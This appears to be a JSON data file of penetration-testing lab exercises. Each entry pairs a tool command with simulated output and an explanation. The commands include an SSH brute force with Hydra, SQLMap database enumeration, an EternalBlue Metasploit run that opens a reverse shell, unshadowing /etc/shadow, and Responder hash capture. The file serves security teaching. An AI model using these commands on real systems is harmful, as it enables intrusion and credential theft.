@@ -1,0 +1,458 @@
+[
+  {
+    "id": "lab-nmap-basics",
+    "title": "Network Discovery with Nmap",
+    "difficulty": "Beginner",
+    "duration": "30 min",
+    "category": "Information Gathering",
+    "description": "Learn to use Nmap for basic network reconnaissance and port scanning.",
+    "steps": [
+      {
+        "title": "Ping Scan",
+        "command": "nmap -sn 192.168.1.0/24",
+        "output": "Starting Nmap 7.94 ( https://nmap.org ) at 2026-03-14 10:00 UTC\nNmap scan report for 192.168.1.1\nHost is up (0.0012s latency).\nNmap scan report for 192.168.1.5\nHost is up (0.0034s latency).\nNmap scan report for 192.168.1.20\nHost is up (0.0089s latency).\nNmap done: 256 IP addresses (3 hosts up) scanned in 2.45 seconds",
+        "explanation": "Performs a ping scan to discover live hosts without port scanning."
+      },
+      {
+        "title": "Basic Port Scan",
+        "command": "nmap 192.168.1.5",
+        "output": "Starting Nmap 7.94 at 2026-03-14 10:01 UTC\nNmap scan report for 192.168.1.5\nHost is up (0.0021s latency).\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n443/tcp  open  https\n8080/tcp open  http-proxy\nNmap done: 1 IP address (1 host up) scanned in 1.32 seconds",
+        "explanation": "Scans the 1000 most common TCP ports on the target."
+      },
+      {
+        "title": "Service Version Detection",
+        "command": "nmap -sV 192.168.1.5",
+        "output": "PORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4\n80/tcp   open  http       Apache httpd 2.4.52\n443/tcp  open  ssl/https  Apache httpd 2.4.52\n8080/tcp open  http-proxy Squid http proxy 5.2",
+        "explanation": "Detects the version of services running on open ports."
+      }
+    ]
+  },
+  {
+    "id": "lab-hydra-ssh",
+    "title": "SSH Brute Force with Hydra",
+    "difficulty": "Intermediate",
+    "duration": "20 min",
+    "category": "Password Attacks",
+    "description": "Simulate a dictionary attack against SSH using Hydra on an authorized test machine.",
+    "steps": [
+      {
+        "title": "Prepare wordlist",
+        "command": "head -20 /usr/share/wordlists/rockyou.txt",
+        "output": "123456\npassword\n12345678\nqwerty\nabc123\nmonkey\n1234567\nletmein\n1234567890\ndragon\n111111\nbaseball\niloveyou\nmaster\nsunshine\npassword1\nshadow\n123123\n654321\nsuperstar",
+        "explanation": "View the top passwords from the rockyou wordlist."
+      },
+      {
+        "title": "Run Hydra against SSH",
+        "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10 -t 4",
+        "output": "Hydra v9.4 starting at 2026-03-14 10:05:00\n[DATA] attacking ssh://192.168.1.10:22/\n[22][ssh] host: 192.168.1.10   login: admin   password: password123\n1 of 1 target successfully completed, 1 valid password found",
+        "explanation": "Hydra performs a dictionary attack. The -t 4 flag limits concurrent connections."
+      }
+    ]
+  },
+  {
+    "id": "lab-sqlmap-injection",
+    "title": "SQL Injection with SQLMap",
+    "difficulty": "Intermediate",
+    "duration": "25 min",
+    "category": "Web Application",
+    "description": "Detect and exploit SQL injection vulnerabilities using SQLMap on a vulnerable test app.",
+    "steps": [
+      {
+        "title": "Basic detection",
+        "command": "sqlmap -u 'http://testphp.vulnweb.com/listproducts.php?cat=1' --batch",
+        "output": "sqlmap identified the following injection point(s):\nParameter: cat (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: cat=1 AND 1=1--\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 1 to 20 columns",
+        "explanation": "SQLMap automatically detects injectable parameters and tests various techniques."
+      },
+      {
+        "title": "Dump database names",
+        "command": "sqlmap -u 'http://testphp.vulnweb.com/listproducts.php?cat=1' --dbs --batch",
+        "output": "available databases [2]:\n[*] acuart\n[*] information_schema",
+        "explanation": "Enumerate all databases accessible via the injection."
+      }
+    ]
+  },
+  {
+    "id": "lab-wireshark-capture",
+    "title": "Network Traffic Analysis with Wireshark/tcpdump",
+    "difficulty": "Beginner",
+    "duration": "20 min",
+    "category": "Sniffing & Spoofing",
+    "description": "Capture and analyze network traffic to understand protocols and detect anomalies.",
+    "steps": [
+      {
+        "title": "Capture HTTP traffic",
+        "command": "tcpdump -i eth0 port 80 -w capture.pcap",
+        "output": "tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n^C\n47 packets captured\n47 packets received by filter\n0 packets dropped by kernel",
+        "explanation": "Captures all HTTP traffic on eth0 and saves to a pcap file."
+      },
+      {
+        "title": "Read the capture",
+        "command": "tcpdump -r capture.pcap -A | grep -i 'GET\\|POST\\|Host:'",
+        "output": "GET /login.php HTTP/1.1\nHost: 192.168.1.100\nGET /admin HTTP/1.1\nHost: 192.168.1.100\nPOST /login.php HTTP/1.1\nHost: 192.168.1.100",
+        "explanation": "Read the pcap and extract HTTP request lines."
+      }
+    ]
+  },
+  {
+    "id": "lab-metasploit-basics",
+    "title": "Metasploit Framework Basics",
+    "difficulty": "Intermediate",
+    "duration": "45 min",
+    "category": "Exploitation",
+    "description": "Learn to search for, configure, and run exploits using the Metasploit Framework.",
+    "steps": [
+      {
+        "title": "Start Metasploit",
+        "command": "msfconsole",
+        "output": "       =[ metasploit v6.3.44-dev                          ]\n+ -- --=[ 2373 exploits - 1232 auxiliary - 413 post       ]\n+ -- --=[ 1395 payloads - 46 encoders - 11 nops            ]\nmsf6 >",
+        "explanation": "Launch the Metasploit console."
+      },
+      {
+        "title": "Search for an exploit",
+        "command": "search eternalblue",
+        "output": "Matching Modules\n================\n   #  Name                                      Rank    Description\n   0  exploit/windows/smb/ms17_010_eternalblue  great   MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption",
+        "explanation": "Search for the EternalBlue exploit module."
+      },
+      {
+        "title": "Use and configure exploit",
+        "command": "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.50\nset LHOST 192.168.1.10\nrun",
+        "output": "msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.50\nRHOSTS => 192.168.1.50\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.10\nLHOST => 192.168.1.10\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > run\n[*] Started reverse TCP handler on 192.168.1.10:4444\n[+] 192.168.1.50:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] WIN - meterpreter session 1 opened",
+        "explanation": "Configure and run the exploit to gain a Meterpreter shell (on authorized test systems only)."
+      }
+    ]
+  },
+  {
+    "id": "lab-hashcat-crack",
+    "title": "Password Cracking with Hashcat",
+    "difficulty": "Intermediate",
+    "duration": "30 min",
+    "category": "Password Attacks",
+    "description": "Use Hashcat to crack MD5 and bcrypt hashes using dictionary and rule-based attacks.",
+    "steps": [
+      {
+        "title": "Identify hash type",
+        "command": "hashid '5f4dcc3b5aa765d61d8327deb882cf99'",
+        "output": "Analyzing '5f4dcc3b5aa765d61d8327deb882cf99'\n[+] MD2\n[+] MD5\n[+] MD4",
+        "explanation": "Use hashid to identify the probable hash algorithm."
+      },
+      {
+        "title": "Crack MD5 hash",
+        "command": "hashcat -m 0 -a 0 5f4dcc3b5aa765d61d8327deb882cf99 /usr/share/wordlists/rockyou.txt",
+        "output": "5f4dcc3b5aa765d61d8327deb882cf99:password\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 0 (MD5)\nTime.Started.....: Sat Mar 14 10:30:00 2026\nTime.Estimated...: Sat Mar 14 10:30:01 2026 (0 secs)\nKernel.Speed.....: 1234.5 MH/s\nRecovered........: 1/1 (100.00%)",
+        "explanation": "-m 0 = MD5 mode, -a 0 = dictionary attack. The hash cracks to 'password'."
+      }
+    ]
+  },
+  {
+    "id": "lab-gobuster-dir",
+    "title": "Web Directory Enumeration with Gobuster",
+    "difficulty": "Beginner",
+    "duration": "15 min",
+    "category": "Web Application",
+    "description": "Discover hidden directories and files on a web server using Gobuster.",
+    "steps": [
+      {
+        "title": "Directory brute force",
+        "command": "gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt",
+        "output": "===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Meiklejohn (@_cmklejohn)\n===============================================================\n[+] Url:                     http://192.168.1.100\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirb/common.txt\n===============================================================\n/admin                (Status: 200) [Size: 4321]\n/backup               (Status: 403) [Size: 278]\n/images               (Status: 301) [Size: 317]\n/login                (Status: 200) [Size: 1892]\n/uploads              (Status: 301) [Size: 320]\n===============================================================",
+        "explanation": "Gobuster tests each word in the wordlist as a path, reporting found directories."
+      }
+    ]
+  },
+  {
+    "id": "lab-aircrack-wpa",
+    "title": "WPA2 Handshake Capture and Crack",
+    "difficulty": "Advanced",
+    "duration": "45 min",
+    "category": "Wireless",
+    "description": "Capture a WPA2 4-way handshake and attempt to crack it using Aircrack-ng (authorized networks only).",
+    "steps": [
+      {
+        "title": "Enable monitor mode",
+        "command": "airmon-ng start wlan0",
+        "output": "PHY\tInterface\tDriver\t\tChipset\nphy0\twlan0\t\trt2800usb\tRalink Technology, Corp. RT2870/RT3070\n\nmonitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon",
+        "explanation": "Put the wireless adapter into monitor mode to capture raw 802.11 frames."
+      },
+      {
+        "title": "Capture handshake",
+        "command": "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon",
+        "output": " CH  6 ][ Elapsed: 12 s ][ 2026-03-14 10:45 ][ WPA handshake: AA:BB:CC:DD:EE:FF\n BSSID              PWR RXQ  Beacons  #Data  CH  ENC  CIPHER AUTH ESSID\n AA:BB:CC:DD:EE:FF  -42 100      120    156   6  WPA2 CCMP   PSK  TestNetwork",
+        "explanation": "Capture traffic on channel 6 for the target BSSID. A WPA handshake is captured."
+      },
+      {
+        "title": "Crack the handshake",
+        "command": "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap",
+        "output": "                               Aircrack-ng 1.7\n      [00:01:24] 12345/9822768 keys tested (1234.56 k/s)\n      KEY FOUND! [ testpassword ]\n      Master Key     : A1 B2 C3 D4 E5 F6 ...",
+        "explanation": "Aircrack-ng tests each password from the wordlist against the handshake."
+      }
+    ]
+  },
+  {
+    "id": "lab-burp-intercept",
+    "title": "HTTP Interception with Burp Suite",
+    "difficulty": "Intermediate",
+    "duration": "30 min",
+    "category": "Web Application",
+    "description": "Configure Burp Suite as a proxy to intercept and modify HTTP requests.",
+    "steps": [
+      {
+        "title": "Start Burp and configure browser proxy",
+        "command": "burpsuite &",
+        "output": "[Burp Suite Community Edition v2023.x starting...]\nListening on 127.0.0.1:8080",
+        "explanation": "Launch Burp Suite. Configure browser to use 127.0.0.1:8080 as proxy."
+      },
+      {
+        "title": "Intercept a request",
+        "command": "# Navigate to target site in browser with proxy enabled\n# Burp intercept shows:\nGET /login HTTP/1.1\nHost: target.com\nUser-Agent: Mozilla/5.0\nCookie: session=abc123",
+        "output": "Request intercepted. Modify and forward or drop.",
+        "explanation": "Burp intercepts the request, allowing modification before forwarding."
+      }
+    ]
+  },
+  {
+    "id": "lab-volatility-memory",
+    "title": "Memory Forensics with Volatility",
+    "difficulty": "Advanced",
+    "duration": "40 min",
+    "category": "Forensics",
+    "description": "Analyze a memory dump to find running processes, network connections, and artifacts.",
+    "steps": [
+      {
+        "title": "Identify OS profile",
+        "command": "volatility -f memory.dmp imageinfo",
+        "output": "Volatility Foundation Volatility Framework 2.6\nINFO    : volatility.debug : Determining profile based on KDBG search...\n          Suggested Profile(s) : Win7SP1x64, Win7SP0x64\n          AS Layer1 : WindowsAMD64PagedMemory",
+        "explanation": "Identify the operating system and suggested profile for the memory dump."
+      },
+      {
+        "title": "List running processes",
+        "command": "volatility -f memory.dmp --profile=Win7SP1x64 pslist",
+        "output": "Offset(V)  Name                PID   PPID  Thds  Hnds  Sess  Time\n0x...      System               4      0     82    449   ----  2026-03-01\n0x...      smss.exe           252      4      2     29   ----  2026-03-01\n0x...      cmd.exe           1337    892      1     23      1  2026-03-14\n0x...      suspicious.exe    4444   1337      5    112      1  2026-03-14",
+        "explanation": "List all running processes at the time of memory capture."
+      },
+      {
+        "title": "Find network connections",
+        "command": "volatility -f memory.dmp --profile=Win7SP1x64 netscan",
+        "output": "Offset     Proto  Local Address       Foreign Address   State   PID\n0x...      TCPv4  192.168.1.50:49201  1.2.3.4:4444    ESTABLISHED  4444",
+        "explanation": "Detect active and recent network connections — note the suspicious outbound connection."
+      }
+    ]
+  },
+  {
+    "id": "lab-nikto-scan",
+    "title": "Web Vulnerability Scanning with Nikto",
+    "difficulty": "Beginner",
+    "duration": "15 min",
+    "category": "Vulnerability Scanning",
+    "description": "Use Nikto to scan a web server for common vulnerabilities and misconfigurations.",
+    "steps": [
+      {
+        "title": "Basic Nikto scan",
+        "command": "nikto -h http://192.168.1.100",
+        "output": "- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Target IP:          192.168.1.100\n+ Target Hostname:    192.168.1.100\n+ Target Port:        80\n---------------------------------------------------------------------------\n+ Server: Apache/2.4.52 (Ubuntu)\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined.\n+ OSVDB-3092: /admin/: This might be interesting...\n+ OSVDB-3268: /images/: Directory indexing found.\n+ /phpinfo.php: PHP Info file found.\n+ 6544 requests: 0 error(s) and 5 item(s) reported on remote host",
+        "explanation": "Nikto reports missing security headers, exposed directories, and sensitive files."
+      }
+    ]
+  },
+  {
+    "id": "lab-john-crack",
+    "title": "Password Cracking with John the Ripper",
+    "difficulty": "Beginner",
+    "duration": "20 min",
+    "category": "Password Attacks",
+    "description": "Crack Unix /etc/shadow password hashes using John the Ripper.",
+    "steps": [
+      {
+        "title": "Unshadow the password file",
+        "command": "unshadow /etc/passwd /etc/shadow > hashes.txt\nhead -3 hashes.txt",
+        "output": "root:$6$saltsalt$hashhashhashhash...:0:0:root:/root:/bin/bash\nwww-data:$6$salt2$hash2...:33:33::/var/www:/usr/sbin/nologin\nuser1:$6$salt3$hash3...:1001:1001::/home/user1:/bin/bash",
+        "explanation": "Combine passwd and shadow into a single file for John to process."
+      },
+      {
+        "title": "Run John with wordlist",
+        "command": "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
+        "output": "Using default input encoding: UTF-8\nLoaded 3 password hashes with 3 different salts (sha512crypt, $6$ [SHA512 256/256 AVX2 4x])\nPress 'q' or Ctrl-C to abort, almost any other key for status\npassword123      (user1)\n1g 0:00:00:08 DONE 0.1257g/s 1440p/s 4320c/s",
+        "explanation": "John tests passwords from rockyou.txt against the hashes."
+      }
+    ]
+  },
+  {
+    "id": "lab-setoolkit-phish",
+    "title": "Social Engineering with SET",
+    "difficulty": "Advanced",
+    "duration": "30 min",
+    "category": "Social Engineering",
+    "description": "Use the Social Engineer Toolkit to create a credential harvesting page (authorized testing only).",
+    "steps": [
+      {
+        "title": "Launch SET",
+        "command": "sudo setoolkit",
+        "output": "   .------..------..------.\n  |S.--. ||E.--. ||T.--. |\n  | :/\\: || (\\/) || :/\\: |\n  | :\\/: || :\\/: || :\\/: |\n  | '--'S|| '--'E|| '--'T|\n  `------'`------'`------'\n  [---]  The Social-Engineer Toolkit (SET) [---]\n  Select from the menu:\n  1) Social-Engineering Attacks\n  2) Penetration Testing (Fast-Track)\n  3) Exit the Social-Engineer Toolkit",
+        "explanation": "SET provides a menu-driven interface for social engineering attacks."
+      }
+    ]
+  },
+  {
+    "id": "lab-ghidra-re",
+    "title": "Reverse Engineering with Ghidra",
+    "difficulty": "Expert",
+    "duration": "60 min",
+    "category": "Reverse Engineering",
+    "description": "Use Ghidra to disassemble and decompile a binary, identify functions and vulnerabilities.",
+    "steps": [
+      {
+        "title": "Check binary with file and strings",
+        "command": "file target_binary && strings target_binary | grep -i 'pass\\|key\\|flag' | head -10",
+        "output": "target_binary: ELF 64-bit LSB pie executable, x86-64\nCHECK_PASSWORD\nEnter password:\nAccess Granted\nAccess Denied\nSECRET_KEY=",
+        "explanation": "Quick recon before loading into Ghidra — strings can reveal hardcoded secrets."
+      },
+      {
+        "title": "Analyze in Ghidra",
+        "command": "# Open Ghidra, create project, import binary\n# Auto-analyze, then open CodeBrowser\n# Decompiler shows:\nvoid check_password(char *input) {\n  if (strcmp(input, \"s3cr3t_p4ss\") == 0) {\n    puts(\"Access Granted\");\n  } else {\n    puts(\"Access Denied\");\n  }\n}",
+        "output": "Hardcoded password found: s3cr3t_p4ss",
+        "explanation": "Ghidra's decompiler reconstructs C-like pseudocode, revealing the hardcoded password."
+      }
+    ]
+  },
+  {
+    "id": "lab-recon-ng",
+    "title": "OSINT with Recon-ng",
+    "difficulty": "Intermediate",
+    "duration": "25 min",
+    "category": "Information Gathering",
+    "description": "Use Recon-ng to gather OSINT on a target domain using various modules.",
+    "steps": [
+      {
+        "title": "Start Recon-ng and create workspace",
+        "command": "recon-ng\nworkspaces create target_corp",
+        "output": "[recon-ng][default] > workspaces create target_corp\n[*] Workspace 'target_corp' created.",
+        "explanation": "Create a workspace to keep findings organized."
+      },
+      {
+        "title": "Add target domain and run modules",
+        "command": "db insert domains\ndomain (TEXT): example.com\nmodules load recon/domains-hosts/hackertarget\nrun",
+        "output": "[*] [hackertarget] URL: https://api.hackertarget.com/hostsearch/?q=example.com\n[*] Country: United States\n[*] Host: mail.example.com => 203.0.113.1\n[*] Host: vpn.example.com => 203.0.113.2\n[*] Host: dev.example.com => 203.0.113.3\n[+] 3 total (3 new) hosts found.",
+        "explanation": "The hackertarget module discovers subdomains via the HackerTarget API."
+      }
+    ]
+  },
+  {
+    "id": "lab-binwalk-firmware",
+    "title": "Firmware Analysis with Binwalk",
+    "difficulty": "Advanced",
+    "duration": "30 min",
+    "category": "Forensics",
+    "description": "Analyze a router firmware image to extract files and find sensitive configurations.",
+    "steps": [
+      {
+        "title": "Scan firmware",
+        "command": "binwalk firmware.bin",
+        "output": "DECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             DLOB firmware header, boot partition: \"dev=/dev/mtdblock/7\"\n116           0x74            uImage header, header size: 64 bytes\n65536         0x10000         Squashfs filesystem, little endian, version 4.0, compression:lzma",
+        "explanation": "Binwalk identifies embedded file systems and data structures in the firmware."
+      },
+      {
+        "title": "Extract and search",
+        "command": "binwalk -e firmware.bin\ngrep -r 'password\\|passwd' _firmware.bin.extracted/ 2>/dev/null | head -10",
+        "output": "_firmware.bin.extracted/squashfs-root/etc/passwd:root:$1$salt$hash:0:0:root:/root:/bin/sh\n_firmware.bin.extracted/squashfs-root/etc/httpd.conf:admin_password=admin123",
+        "explanation": "Extract the filesystem and search for hardcoded credentials."
+      }
+    ]
+  },
+  {
+    "id": "lab-enum4linux",
+    "title": "Windows/Samba Enumeration with enum4linux",
+    "difficulty": "Intermediate",
+    "duration": "20 min",
+    "category": "Information Gathering",
+    "description": "Enumerate Windows and Samba shares, users, and policies.",
+    "steps": [
+      {
+        "title": "Full enumeration",
+        "command": "enum4linux -a 192.168.1.10",
+        "output": "Starting enum4linux v0.9.1 ( https://github.com/CiscoCXSecurity/enum4linux )\n============================( Workgroup/Domain )==========================\n[+] Got domain/workgroup name: WORKGROUP\n============================( Users on 192.168.1.10 )====================\n[+] Found user 'Administrator' (RID: 500)\n[+] Found user 'Guest' (RID: 501)\n[+] Found user 'jdoe' (RID: 1000)\n============================( Share Enumeration )==========================\n[+] Found share 'IPC$'\n[+] Found share 'C$'\n[+] Found share 'ADMIN$'\n[+] Found share 'data' (Access: Read/Write)",
+        "explanation": "enum4linux enumerates users, groups, shares, and password policies from SMB."
+      }
+    ]
+  },
+  {
+    "id": "lab-responder-ntlm",
+    "title": "NTLM Hash Capture with Responder",
+    "difficulty": "Advanced",
+    "duration": "25 min",
+    "category": "Sniffing & Spoofing",
+    "description": "Use Responder to capture NTLMv2 hashes via LLMNR/NBT-NS poisoning on an authorized internal network.",
+    "steps": [
+      {
+        "title": "Start Responder",
+        "command": "sudo responder -I eth0 -rdwv",
+        "output": "                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.---.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   |\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n[+] Listening for events...\n[HTTP] NTLMv2 Client   : 192.168.1.25\n[HTTP] Username         : DOMAIN\\jdoe\n[HTTP] NTLMv2-SSP Hash  : jdoe::DOMAIN:1122334455667788:ABC123...",
+        "explanation": "Responder captures NTLMv2 hashes when clients attempt to connect to fake services."
+      },
+      {
+        "title": "Crack the captured hash",
+        "command": "hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt",
+        "output": "jdoe::DOMAIN:...:Password1!\nSession..........: hashcat\nStatus...........: Cracked",
+        "explanation": "Mode 5600 cracks NTLMv2 hashes. The result reveals jdoe's password."
+      }
+    ]
+  },
+  {
+    "id": "lab-openssl-crypto",
+    "title": "Cryptography with OpenSSL",
+    "difficulty": "Beginner",
+    "duration": "20 min",
+    "category": "Cryptography",
+    "description": "Use OpenSSL to generate keys, encrypt files, and inspect certificates.",
+    "steps": [
+      {
+        "title": "Generate RSA key pair",
+        "command": "openssl genrsa -out private.pem 2048\nopenssl rsa -in private.pem -pubout -out public.pem",
+        "output": "Generating RSA private key, 2048 bit long modulus\n.....+++++\n...+++++\ne is 65537 (0x10001)\nwriting RSA key",
+        "explanation": "Generate a 2048-bit RSA private key and extract the corresponding public key."
+      },
+      {
+        "title": "Encrypt and decrypt a file",
+        "command": "echo 'secret message' > plaintext.txt\nopenssl rsautl -encrypt -pubin -inkey public.pem -in plaintext.txt -out encrypted.bin\nopenssl rsautl -decrypt -inkey private.pem -in encrypted.bin",
+        "output": "secret message",
+        "explanation": "Encrypt a file with the public key; only the private key holder can decrypt it."
+      }
+    ]
+  },
+  {
+    "id": "lab-steghide",
+    "title": "Steganography with Steghide",
+    "difficulty": "Beginner",
+    "duration": "15 min",
+    "category": "Steganography",
+    "description": "Hide and extract secret messages within image files using Steghide.",
+    "steps": [
+      {
+        "title": "Embed data in image",
+        "command": "echo 'This is a secret message' > secret.txt\nsteghide embed -cf photo.jpg -sf secret.txt -p 'mypassword'",
+        "output": "embedding \"secret.txt\" in \"photo.jpg\"... done",
+        "explanation": "Steghide embeds the secret.txt data inside photo.jpg using AES-128 encryption."
+      },
+      {
+        "title": "Extract hidden data",
+        "command": "steghide extract -sf photo.jpg -p 'mypassword'",
+        "output": "wrote extracted data to \"secret.txt\".",
+        "explanation": "Extract the hidden data using the correct passphrase."
+      }
+    ]
+  },
+  {
+    "id": "lab-nuclei-scan",
+    "title": "Automated Vulnerability Scanning with Nuclei",
+    "difficulty": "Intermediate",
+    "duration": "20 min",
+    "category": "Vulnerability Scanning",
+    "description": "Use Nuclei with community templates to scan for known vulnerabilities and exposures.",
+    "steps": [
+      {
+        "title": "Update templates and scan",
+        "command": "nuclei -u http://192.168.1.100 -t cves/ -severity critical,high",
+        "output": "[2026-03-14 10:00:00] [cve-2021-44228] [http] [critical] http://192.168.1.100 [log4shell]\n[2026-03-14 10:00:02] [cve-2017-9841] [http] [critical] http://192.168.1.100/vendor/phpunit\n[2026-03-14 10:00:05] [exposed-panels:phpmyadmin] [http] [medium] http://192.168.1.100/phpmyadmin\n\nTotal: 3 findings",
+        "explanation": "Nuclei checks the target against thousands of CVE and misconfiguration templates."
+      }
+    ]
+  }
+]
